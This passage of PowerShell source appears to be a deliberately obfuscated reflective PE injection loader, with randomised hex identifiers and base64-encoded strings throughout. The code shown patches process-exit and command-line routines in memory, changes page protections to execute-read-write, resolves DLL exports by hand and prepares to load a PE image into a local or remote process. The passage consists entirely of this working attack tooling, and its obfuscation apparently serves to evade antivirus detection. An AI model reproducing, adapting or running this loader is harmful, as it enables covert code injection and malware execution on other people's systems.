		d7d2ae269baa46a58bd04253c3153bc2 -edfb5fb877c340feb6fd2a333d64fd54 ${96cec78ee78c4840907786cf6f3bd316} -cc9e6267b5c84fa69bc06f7a58cb4fb0 ${a37d8a3fb0194b2f881f45d5d0f6b77e}
		${a37d8a3fb0194b2f881f45d5d0f6b77e} = c36a6fff11ae41aab0147e8eb916744d ${a37d8a3fb0194b2f881f45d5d0f6b77e} (${96cec78ee78c4840907786cf6f3bd316}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${c41ebb09215046f49c8358333d8e47dd}, ${a37d8a3fb0194b2f881f45d5d0f6b77e}, $false)
		${a37d8a3fb0194b2f881f45d5d0f6b77e} = c36a6fff11ae41aab0147e8eb916744d ${a37d8a3fb0194b2f881f45d5d0f6b77e} ${3ff8b22ecd6e4e91a20a6c4bd8305519}
		d7d2ae269baa46a58bd04253c3153bc2 -edfb5fb877c340feb6fd2a333d64fd54 ${46261f09b8ec4df79944e1243d88aa37} -cc9e6267b5c84fa69bc06f7a58cb4fb0 ${a37d8a3fb0194b2f881f45d5d0f6b77e}
		$Win32Functions.VirtualProtect.Invoke(${dd2f5cd1593f484ab0516e98e3fcef79}, [UInt32]${458a5042855b49a0b88b64dc805980e8}, [UInt32]${b493ea0291514174ae1ea00c1112096f}, [Ref]${b493ea0291514174ae1ea00c1112096f}) | Out-Null
		${04f6524ab8d54a13a60a10155214cad6} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQBkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMAAuAGQAbABsAA=='))) `
			, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAC4AZABsAGwA'))))
		foreach (${61a141e734b7438c93ab702756c740ce} in ${04f6524ab8d54a13a60a10155214cad6})
		{
			[IntPtr]${3651a8d8925149d1bce73d65aafb5617} = $Win32Functions.GetModuleHandle.Invoke(${61a141e734b7438c93ab702756c740ce})
			if (${3651a8d8925149d1bce73d65aafb5617} -ne [IntPtr]::Zero)
			{
				[IntPtr]${2406a20c1aac41c28e534d850fa05a34} = $Win32Functions.GetProcAddress.Invoke(${3651a8d8925149d1bce73d65aafb5617}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwB3AGMAbQBkAGwAbgA='))))
				[IntPtr]${1db272c617fa419fa08191bdf85237df} = $Win32Functions.GetProcAddress.Invoke(${3651a8d8925149d1bce73d65aafb5617}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBhAGMAbQBkAGwAbgA='))))
				if (${2406a20c1aac41c28e534d850fa05a34} -eq [IntPtr]::Zero -or ${1db272c617fa419fa08191bdf85237df} -eq [IntPtr]::Zero)
				{
					$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACwAIABjAG8AdQBsAGQAbgAnAHQAIABmAGkAbgBkACAAXwB3AGMAbQBkAGwAbgAgAG8AcgAgAF8AYQBjAG0AZABsAG4A')))
				}
				${9c6e51a523b34474a4705d0c4d94471a} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${dc4dd6aa6e944b868aa4edbd1d8c272a})
				${17e0781c853a41b28fab1628c6b83517} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${dc4dd6aa6e944b868aa4edbd1d8c272a})
				${3afedf10b66e470a9fc8221c55a4d095} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${1db272c617fa419fa08191bdf85237df}, [Type][IntPtr])
				${c85c9351fa8f48dcac5d8ee27c100d57} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${2406a20c1aac41c28e534d850fa05a34}, [Type][IntPtr])
				${232d9033cb7647dea02e16f55416cd59} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${3ff8b22ecd6e4e91a20a6c4bd8305519})
				${fbcd5877bc814329a1b82d0b43c375f4} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${3ff8b22ecd6e4e91a20a6c4bd8305519})
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${3afedf10b66e470a9fc8221c55a4d095}, ${232d9033cb7647dea02e16f55416cd59}, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${c85c9351fa8f48dcac5d8ee27c100d57}, ${fbcd5877bc814329a1b82d0b43c375f4}, $false)
				${8c5b17b18a504e3e83f8aa28429ee923} += ,(${1db272c617fa419fa08191bdf85237df}, ${232d9033cb7647dea02e16f55416cd59}, ${3ff8b22ecd6e4e91a20a6c4bd8305519})
				${8c5b17b18a504e3e83f8aa28429ee923} += ,(${2406a20c1aac41c28e534d850fa05a34}, ${fbcd5877bc814329a1b82d0b43c375f4}, ${3ff8b22ecd6e4e91a20a6c4bd8305519})
				${b252c80d481e4d599d8c2226f6c56423} = $Win32Functions.VirtualProtect.Invoke(${1db272c617fa419fa08191bdf85237df}, [UInt32]${3ff8b22ecd6e4e91a20a6c4bd8305519}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${b493ea0291514174ae1ea00c1112096f})
				if (${b252c80d481e4d599d8c2226f6c56423} = $false)
				{
					throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${9c6e51a523b34474a4705d0c4d94471a}, ${1db272c617fa419fa08191bdf85237df}, $false)
				$Win32Functions.VirtualProtect.Invoke(${1db272c617fa419fa08191bdf85237df}, [UInt32]${3ff8b22ecd6e4e91a20a6c4bd8305519}, [UInt32](${b493ea0291514174ae1ea00c1112096f}), [Ref]${b493ea0291514174ae1ea00c1112096f}) | Out-Null
				${b252c80d481e4d599d8c2226f6c56423} = $Win32Functions.VirtualProtect.Invoke(${2406a20c1aac41c28e534d850fa05a34}, [UInt32]${3ff8b22ecd6e4e91a20a6c4bd8305519}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${b493ea0291514174ae1ea00c1112096f})
				if (${b252c80d481e4d599d8c2226f6c56423} = $false)
				{
					throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${17e0781c853a41b28fab1628c6b83517}, ${2406a20c1aac41c28e534d850fa05a34}, $false)
				$Win32Functions.VirtualProtect.Invoke(${2406a20c1aac41c28e534d850fa05a34}, [UInt32]${3ff8b22ecd6e4e91a20a6c4bd8305519}, [UInt32](${b493ea0291514174ae1ea00c1112096f}), [Ref]${b493ea0291514174ae1ea00c1112096f}) | Out-Null
			}
		}
		${8c5b17b18a504e3e83f8aa28429ee923} = @()
		${116311fcfa2b4affb1a27fb97671b2a5} = @() 
		[IntPtr]${119ff28e52b346388c1cdb79a9970ce8} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAuAGQAbABsAA=='))))
		if (${119ff28e52b346388c1cdb79a9970ce8} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
		}
		[IntPtr]${2b121dcdb75e4e389a77b424113c6293} = $Win32Functions.GetProcAddress.Invoke(${119ff28e52b346388c1cdb79a9970ce8}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
		if (${2b121dcdb75e4e389a77b424113c6293} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
		}
		${116311fcfa2b4affb1a27fb97671b2a5} += ${2b121dcdb75e4e389a77b424113c6293}
		[IntPtr]${f77041d8d55642229f134cd3b188503c} = $Win32Functions.GetProcAddress.Invoke(${e04853482a0844609e341ee78518fdf4}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
		if (${f77041d8d55642229f134cd3b188503c} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
		}
		${116311fcfa2b4affb1a27fb97671b2a5} += ${f77041d8d55642229f134cd3b188503c}
		[UInt32]${b493ea0291514174ae1ea00c1112096f} = 0
		foreach (${ed84cc7bc4a740c48e06292dcb6ccf42} in ${116311fcfa2b4affb1a27fb97671b2a5})
		{
			${3add99b7260f49529df367d96fa8bca7} = ${ed84cc7bc4a740c48e06292dcb6ccf42}
			[Byte[]]${96cec78ee78c4840907786cf6f3bd316} = @(0xbb)
			[Byte[]]${46261f09b8ec4df79944e1243d88aa37} = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			if (${3ff8b22ecd6e4e91a20a6c4bd8305519} -eq 8)
			{
				[Byte[]]${96cec78ee78c4840907786cf6f3bd316} = @(0x48, 0xbb)
				[Byte[]]${46261f09b8ec4df79944e1243d88aa37} = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]${8acfd409e67e43c5b9245a1699894c42} = @(0xff, 0xd3)
			${458a5042855b49a0b88b64dc805980e8} = ${96cec78ee78c4840907786cf6f3bd316}.Length + ${3ff8b22ecd6e4e91a20a6c4bd8305519} + ${46261f09b8ec4df79944e1243d88aa37}.Length + ${3ff8b22ecd6e4e91a20a6c4bd8305519} + ${8acfd409e67e43c5b9245a1699894c42}.Length
			[IntPtr]${145e4f07470346cf9d9d9ac8b631053f} = $Win32Functions.GetProcAddress.Invoke(${e04853482a0844609e341ee78518fdf4}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAA='))))
			if (${145e4f07470346cf9d9d9ac8b631053f} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAAgAGEAZABkAHIAZQBzAHMAIABuAG8AdAAgAGYAbwB1AG4AZAA=')))
			}
			${b252c80d481e4d599d8c2226f6c56423} = $Win32Functions.VirtualProtect.Invoke(${ed84cc7bc4a740c48e06292dcb6ccf42}, [UInt32]${458a5042855b49a0b88b64dc805980e8}, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]${b493ea0291514174ae1ea00c1112096f})
			if (${b252c80d481e4d599d8c2226f6c56423} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
			}
			${8e81404f345649beb1cef01c5032e101} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${458a5042855b49a0b88b64dc805980e8})
			$Win32Functions.memcpy.Invoke(${8e81404f345649beb1cef01c5032e101}, ${ed84cc7bc4a740c48e06292dcb6ccf42}, [UInt64]${458a5042855b49a0b88b64dc805980e8}) | Out-Null
			${8c5b17b18a504e3e83f8aa28429ee923} += ,(${ed84cc7bc4a740c48e06292dcb6ccf42}, ${8e81404f345649beb1cef01c5032e101}, ${458a5042855b49a0b88b64dc805980e8})
			d7d2ae269baa46a58bd04253c3153bc2 -edfb5fb877c340feb6fd2a333d64fd54 ${96cec78ee78c4840907786cf6f3bd316} -cc9e6267b5c84fa69bc06f7a58cb4fb0 ${3add99b7260f49529df367d96fa8bca7}
			${3add99b7260f49529df367d96fa8bca7} = c36a6fff11ae41aab0147e8eb916744d ${3add99b7260f49529df367d96fa8bca7} (${96cec78ee78c4840907786cf6f3bd316}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${cf87c75665104b0d9bce1914a6e20ded}, ${3add99b7260f49529df367d96fa8bca7}, $false)
			${3add99b7260f49529df367d96fa8bca7} = c36a6fff11ae41aab0147e8eb916744d ${3add99b7260f49529df367d96fa8bca7} ${3ff8b22ecd6e4e91a20a6c4bd8305519}
			d7d2ae269baa46a58bd04253c3153bc2 -edfb5fb877c340feb6fd2a333d64fd54 ${46261f09b8ec4df79944e1243d88aa37} -cc9e6267b5c84fa69bc06f7a58cb4fb0 ${3add99b7260f49529df367d96fa8bca7}
			${3add99b7260f49529df367d96fa8bca7} = c36a6fff11ae41aab0147e8eb916744d ${3add99b7260f49529df367d96fa8bca7} (${46261f09b8ec4df79944e1243d88aa37}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${145e4f07470346cf9d9d9ac8b631053f}, ${3add99b7260f49529df367d96fa8bca7}, $false)
			${3add99b7260f49529df367d96fa8bca7} = c36a6fff11ae41aab0147e8eb916744d ${3add99b7260f49529df367d96fa8bca7} ${3ff8b22ecd6e4e91a20a6c4bd8305519}
			d7d2ae269baa46a58bd04253c3153bc2 -edfb5fb877c340feb6fd2a333d64fd54 ${8acfd409e67e43c5b9245a1699894c42} -cc9e6267b5c84fa69bc06f7a58cb4fb0 ${3add99b7260f49529df367d96fa8bca7}
			$Win32Functions.VirtualProtect.Invoke(${ed84cc7bc4a740c48e06292dcb6ccf42}, [UInt32]${458a5042855b49a0b88b64dc805980e8}, [UInt32]${b493ea0291514174ae1ea00c1112096f}, [Ref]${b493ea0291514174ae1ea00c1112096f}) | Out-Null
		}
		echo ${8c5b17b18a504e3e83f8aa28429ee923}
	}
	Function d9840a9ff0174cfb95902793f665a5ff
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		${bb61f798428f4a9e9b420dbf53df5840},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		[UInt32]${b493ea0291514174ae1ea00c1112096f} = 0
		foreach (${b3304135a5ce4351943d5558f0bdde36} in ${bb61f798428f4a9e9b420dbf53df5840})
		{
			${b252c80d481e4d599d8c2226f6c56423} = $Win32Functions.VirtualProtect.Invoke(${b3304135a5ce4351943d5558f0bdde36}[0], [UInt32]${b3304135a5ce4351943d5558f0bdde36}[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]${b493ea0291514174ae1ea00c1112096f})
			if (${b252c80d481e4d599d8c2226f6c56423} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
			}
			$Win32Functions.memcpy.Invoke(${b3304135a5ce4351943d5558f0bdde36}[0], ${b3304135a5ce4351943d5558f0bdde36}[1], [UInt64]${b3304135a5ce4351943d5558f0bdde36}[2]) | Out-Null
			$Win32Functions.VirtualProtect.Invoke(${b3304135a5ce4351943d5558f0bdde36}[0], [UInt32]${b3304135a5ce4351943d5558f0bdde36}[2], [UInt32]${b493ea0291514174ae1ea00c1112096f}, [Ref]${b493ea0291514174ae1ea00c1112096f}) | Out-Null
		}
	}
	Function a6a1776ab04645f5a91d11b65d41a99d
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${d9510966a3a443f1926a3ce72ac5937f},
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		${b901d24efb9d4ba6b718c36dbdc6a70d}
		)
		$Win32Types = c1f42a3f37b440c28548cfb7f311709b
		$Win32Constants = b3df47e05c264da9935d94ccf1848c18
		${b5905e299da14ea186abe1140fee1a54} = a4058eb6b7e24f7f8d162c0ac15a5e95 -d9510966a3a443f1926a3ce72ac5937f ${d9510966a3a443f1926a3ce72ac5937f} -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (${b5905e299da14ea186abe1140fee1a54}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		${87af05f8188943dab520fa70a5e2f23d} = c36a6fff11ae41aab0147e8eb916744d (${d9510966a3a443f1926a3ce72ac5937f}) (${b5905e299da14ea186abe1140fee1a54}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		${a8d33d176e094e4cad0e644c9b3b2e91} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${87af05f8188943dab520fa70a5e2f23d}, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		for (${becf8c3d80c34e9fbea46c736519a57b} = 0; ${becf8c3d80c34e9fbea46c736519a57b} -lt ${a8d33d176e094e4cad0e644c9b3b2e91}.NumberOfNames; ${becf8c3d80c34e9fbea46c736519a57b}++)
		{
			${8fb6540551e84bbc82f97206dbb87cdf} = c36a6fff11ae41aab0147e8eb916744d (${d9510966a3a443f1926a3ce72ac5937f}) (${a8d33d176e094e4cad0e644c9b3b2e91}.AddressOfNames + (${becf8c3d80c34e9fbea46c736519a57b} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			${2f4d07bf1bb54fd6b186e8d00d0297fd} = c36a6fff11ae41aab0147e8eb916744d (${d9510966a3a443f1926a3ce72ac5937f}) ([System.Runtime.InteropServices.Marshal]::PtrToStructure(${8fb6540551e84bbc82f97206dbb87cdf}, [Type][UInt32]))
			${7450ae9af2fe4be591890fd173d8fcc5} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${2f4d07bf1bb54fd6b186e8d00d0297fd})
			if (${7450ae9af2fe4be591890fd173d8fcc5} -ceq ${b901d24efb9d4ba6b718c36dbdc6a70d})
			{
				${fbfaf05342504451a8461551672e567a} = c36a6fff11ae41aab0147e8eb916744d (${d9510966a3a443f1926a3ce72ac5937f}) (${a8d33d176e094e4cad0e644c9b3b2e91}.AddressOfNameOrdinals + (${becf8c3d80c34e9fbea46c736519a57b} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				${9fc299b419914693b415e986235531a2} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${fbfaf05342504451a8461551672e567a}, [Type][UInt16])
				${837429268f264c1998f63d5405a7d134} = c36a6fff11ae41aab0147e8eb916744d (${d9510966a3a443f1926a3ce72ac5937f}) (${a8d33d176e094e4cad0e644c9b3b2e91}.AddressOfFunctions + (${9fc299b419914693b415e986235531a2} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				${f88e9a32111144e6a5688c7716c6e688} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${837429268f264c1998f63d5405a7d134}, [Type][UInt32])
				return c36a6fff11ae41aab0147e8eb916744d (${d9510966a3a443f1926a3ce72ac5937f}) (${f88e9a32111144e6a5688c7716c6e688})
			}
		}
		return [IntPtr]::Zero
	}
	Function c6b6bc5e4c9948e0b08ce83eca04d8e9
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		${c8e0d86ea0e74817acb552fc5014588b},
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		${e6db2bb213e84f06b160fdf34abced4c},
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		${b8098c5a8297473498a6b72001bbfcf1},
        [Parameter(Position = 3)]
        [Bool]
        ${aa082364f7c3405b8c53e70e1ebc7a97} = $false
		)
		${3ff8b22ecd6e4e91a20a6c4bd8305519} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$Win32Constants = b3df47e05c264da9935d94ccf1848c18
		$Win32Functions = e17a4d1d978844eb8928769c36ef96fa
		$Win32Types = c1f42a3f37b440c28548cfb7f311709b
		${3df75c88c87d449581d2b42e447373e5} = $false
		if ((${b8098c5a8297473498a6b72001bbfcf1} -ne $null) -and (${b8098c5a8297473498a6b72001bbfcf1} -ne [IntPtr]::Zero))
		{
			${3df75c88c87d449581d2b42e447373e5} = $true
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGIAYQBzAGkAYwAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGYAaQBsAGUA')))
		${b5905e299da14ea186abe1140fee1a54} = a3030bd3659543dfa92317be2d7abf31 -c8e0d86ea0e74817acb552fc5014588b ${c8e0d86ea0e74817acb552fc5014588b} -Win32Types $Win32Types
		${bbdf587793764367b319a04d6eb00abe} = ${b5905e299da14ea186abe1140fee1a54}.OriginalImageBase
		${67971bbd18cc497f9e99c62a0974e4ce} = $true
		if (([Int] ${b5905e299da14ea186abe1140fee1a54}.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAaQBzACAAbgBvAHQAIABjAG8AbQBwAGEAdABpAGIAbABlACAAdwBpAHQAaAAgAEQARQBQACwAIABtAGkAZwBoAHQAIABjAGEAdQBzAGUAIABpAHMAcwB1AGUAcwA='))) -WarningAction Continue
			${67971bbd18cc497f9e99c62a0974e4ce} = $false
		}
		${65d4e6c96604433b91a0f78aed6fdb2d} = $true
		if (${3df75c88c87d449581d2b42e447373e5} -eq $true)
		{
			${e04853482a0844609e341ee78518fdf4} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
			${8e08ff89ff934c1fbfa999be923764fb} = $Win32Functions.GetProcAddress.Invoke(${e04853482a0844609e341ee78518fdf4}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFcAbwB3ADYANABQAHIAbwBjAGUAcwBzAA=='))))
			if (${8e08ff89ff934c1fbfa999be923764fb} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAbABvAGMAYQB0AGUAIABJAHMAVwBvAHcANgA0AFAAcgBvAGMAZQBzAHMAIABmAHUAbgBjAHQAaQBvAG4AIAB0AG8AIABkAGUAdABlAHIAbQBpAG4AZQAgAGkAZgAgAHQAYQByAGcAZQB0ACAAcAByAG8AYwBlAHMAcwAgAGkAcwAgADMAMgBiAGkAdAAgAG8AcgAgADYANABiAGkAdAA=')))
			}
			[Bool]${2c5016eb04c844549640e31d31df4b0c} = $false
			${b252c80d481e4d599d8c2226f6c56423} = $Win32Functions.IsWow64Process.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, [Ref]${2c5016eb04c844549640e31d31df4b0c})
			if (${b252c80d481e4d599d8c2226f6c56423} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEkAcwBXAG8AdwA2ADQAUAByAG8AYwBlAHMAcwAgAGYAYQBpAGwAZQBkAA==')))
			}
			if ((${2c5016eb04c844549640e31d31df4b0c} -eq $true) -or ((${2c5016eb04c844549640e31d31df4b0c} -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				${65d4e6c96604433b91a0f78aed6fdb2d} = $false
			}
			${c55a67fb172f47ba8ff7595ca94594b6} = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${c55a67fb172f47ba8ff7595ca94594b6} = $false
			}
			if (${c55a67fb172f47ba8ff7595ca94594b6} -ne ${65d4e6c96604433b91a0f78aed6fdb2d})
			{
				throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAG0AdQBzAHQAIABiAGUAIABzAGEAbQBlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIAAoAHgAOAA2AC8AeAA2ADQAKQAgAGEAcwAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAYQBuAGQAIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMA')))
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${65d4e6c96604433b91a0f78aed6fdb2d} = $false
			}
		}
		if (${65d4e6c96604433b91a0f78aed6fdb2d} -ne ${b5905e299da14ea186abe1140fee1a54}.PE64Bit)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAcABsAGEAdABmAG8AcgBtACAAZABvAGUAcwBuACcAdAAgAG0AYQB0AGMAaAAgAHQAaABlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIABvAGYAIAB0AGgAZQAgAHAAcgBvAGMAZQBzAHMAIABpAHQAIABpAHMAIABiAGUAaQBuAGcAIABsAG8AYQBkAGUAZAAgAGkAbgAgACgAMwAyAC8ANgA0AGIAaQB0ACkA')))
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAGEAdABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIAB0AGgAZQAgAFAARQAgAGEAbgBkACAAdwByAGkAdABlACAAaQB0AHMAIABoAGUAYQBkAGUAcgBzACAAdABvACAAbQBlAG0AbwByAHkA')))
		[IntPtr]${e3f8667d5e364efd96c0bb33c49e6df9} = [IntPtr]::Zero
        ${00a74bd019ae4a419665129fb47a4135} = ([Int] ${b5905e299da14ea186abe1140fee1a54}.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not ${aa082364f7c3405b8c53e70e1ebc7a97}) -and (-not ${00a74bd019ae4a419665129fb47a4135}))
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGIAZQBpAG4AZwAgAHIAZQBmAGwAZQBjAHQAaQB2AGUAbAB5ACAAbABvAGEAZABlAGQAIABpAHMAIABuAG8AdAAgAEEAUwBMAFIAIABjAG8AbQBwAGEAdABpAGIAbABlAC4AIABJAGYAIAB0AGgAZQAgAGwAbwBhAGQAaQBuAGcAIABmAGEAaQBsAHMALAAgAHQAcgB5ACAAcgBlAHMAdABhAHIAdABpAG4AZwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABhAG4AZAAgAHQAcgB5AGkAbgBnACAAYQBnAGEAaQBuACAATwBSACAAdAByAHkAIAB1AHMAaQBuAGcAIAB0AGgAZQAgAC0ARgBvAHIAYwBlAEEAUwBMAFIAIABmAGwAYQBnACAAKABjAG8AdQBsAGQAIABjAGEAdQBzAGUAIABjAHIAYQBzAGgAZQBzACkA'))) -WarningAction Continue
			[IntPtr]${e3f8667d5e364efd96c0bb33c49e6df9} = ${bbdf587793764367b319a04d6eb00abe}
		}
        elseif (${aa082364f7c3405b8c53e70e1ebc7a97} -and (-not ${00a74bd019ae4a419665129fb47a4135}))
        {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGQAbwBlAHMAbgAnAHQAIABzAHUAcABwAG8AcgB0ACAAQQBTAEwAUgAgAGIAdQB0ACAALQBGAG8AcgBjAGUAQQBTAEwAUgAgAGkAcwAgAHMAZQB0AC4AIABGAG8AcgBjAGkAbgBnACAAQQBTAEwAUgAgAG8AbgAgAHQAaABlACAAUABFACAAZgBpAGwAZQAuACAAVABoAGkAcwAgAGMAbwB1AGwAZAAgAHIAZQBzAHUAbAB0ACAAaQBuACAAYQAgAGMAcgBhAHMAaAAuAA==')))
        }
        if (${aa082364f7c3405b8c53e70e1ebc7a97} -and ${3df75c88c87d449581d2b42e447373e5})
        {
